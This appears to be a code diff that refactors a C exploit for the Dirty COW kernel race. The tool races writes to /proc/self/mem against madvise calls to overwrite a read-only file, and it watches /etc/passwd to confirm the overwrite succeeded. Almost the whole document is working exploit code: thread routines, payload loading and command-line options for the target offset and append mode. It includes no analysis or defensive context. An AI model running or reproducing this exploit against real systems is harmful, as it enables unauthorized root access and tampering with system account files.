@@ -34,6 +34,7 @@
 
 #define VIRTUAL_MEMORY "/proc/self/mem"
 #define THREAD_ITERATIONS 10000
+
 int stop = 0;
 
 typedef struct payload_info {
@@ -52,7 +53,7 @@ void *writer_thread(void *arg) {
 
 	int fd = open(VIRTUAL_MEMORY, O_RDWR);
 	ERR_IF(fd < 0);
-	
+
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
 		lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
 		write(fd, str, strlen(str));
@@ -68,22 +69,25 @@ void *madviser_thread(void *arg) {
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
+
 	return NULL;
 }
 
-void *waitForWrite(void *arg) {
+void *wait_for_write(void *arg) {
 	PayloadInfo *info = arg;
-	int len = strlen(info->string);
-	char *buf = calloc(len, sizeof(char));
-	int fd, seek;
+	size_t len = strlen(info->string);
 
-	for(;;) {
-		fd = open("/etc/passwd", O_RDONLY);
+	while (true) {
+		char buf[len];
+		memset(buf, '\0', len);
+
+		int fd = open("/etc/passwd", O_RDONLY);
 		ERR_IF(fd < 0);
-		seek = lseek(fd, info->offset, SEEK_SET);
+
+		ERR_IF(lseek(fd, info->offset, SEEK_SET) < 0);
 		ERR_IF(read(fd, buf, len) < 0);
 
-		if(memcmp(buf, info->string, len) == 0 && !info->append) {
+		if (memcmp(buf, info->string, len) == 0 && !info->append) {
 			printf("Target file is overwritten\n");
 			break;
 		}
@@ -94,7 +98,6 @@ void *waitForWrite(void *arg) {
 		sleep(1);
 	}
 
-	free(buf);
 	stop = 1;
 	printf("Stop set to 1\n"); 
 
@@ -102,16 +105,19 @@ void *waitForWrite(void *arg) {
 }
 
 // Load Payload into string from specified file
-char *loadPayload(int fd) {
-	int size_file = lseek(fd, 0, SEEK_END);
-	lseek(fd, 0, SEEK_SET);
-	char *string_ptr = calloc(size_file, sizeof(char));
-	ERR_IF(read(fd, string_ptr, size_file) < 0);
-	string_ptr[size_file] = '\0';
-	return string_ptr;
+char *load_payload(int fd) {
+	struct stat file_info;
+	ERR_IF(fstat(fd, &file_info) < 0);
+
+	off_t file_size = file_info.st_size;
+	char *contents = calloc(file_size + 1, sizeof(char));
+	ERR_IF(read(fd, contents, file_size) != file_size);
+	contents[file_size] = '\0';
+
+	return contents;
 }
 
-void print_help() {
+void print_help(void) {
 	printf("-f, --file   \t name of file contatining the payload\n"
 			"-s, --string\t use command line arg string as payload\n"
 			"-o, --offset\t offset postition for lseek (hex)\n"
@@ -131,7 +137,7 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 
  	while (true) {
 		int option_index = 0;
-		static struct option long_options[] = {
+		struct option long_options[] = {
 			{"file",    required_argument, 0, 'f' },
 			{"append",  no_argument,       0, 'a' },
 			{"string",  no_argument,       0, 's' },
@@ -150,15 +156,15 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 				printf("option %s", long_options[option_index].name);
 
 				if (optarg) {
-					printf (" with arg %s", optarg);
+					printf(" with arg %s", optarg);
 				}
 
-				printf ("\n");
+				printf("\n");
 				break;
 			case 'f':  // file containing payload
 				info.input_fd = open(optarg, O_RDONLY);
 				ERR_IF(info.input_fd < 0);
-				info.string = loadPayload(info.input_fd);
+				info.string = load_payload(info.input_fd);
 				break;
 			case 'o':  // offset position for payload (hex)
 				sscanf(optarg, "%x", (unsigned int*) &info.offset);
@@ -188,7 +194,7 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 	info.target_fd = open(argv[argc-1], O_RDONLY);
 	ERR_IF(info.target_fd < 0);
 
-	if(info.append) {
+	if (info.append) {
 		info.offset = lseek(info.target_fd, 0, SEEK_END);
 		lseek(info.target_fd, 0, SEEK_SET);
 	}
@@ -211,7 +217,7 @@ int main(int argc, char *argv[]) {
 
 	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
 	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
-	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, waitForWrite, &info));
+	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, wait_for_write, &info));
 
 	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
 	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
@@ -221,7 +227,7 @@ int main(int argc, char *argv[]) {
 	close(info.target_fd);
 
 	// if memory allocated for storing payload from an input file, then free
-	if(info.input_fd != STDIN_FILENO) {
+	if (info.input_fd != STDIN_FILENO) {
 		free(info.string);
 	}
 
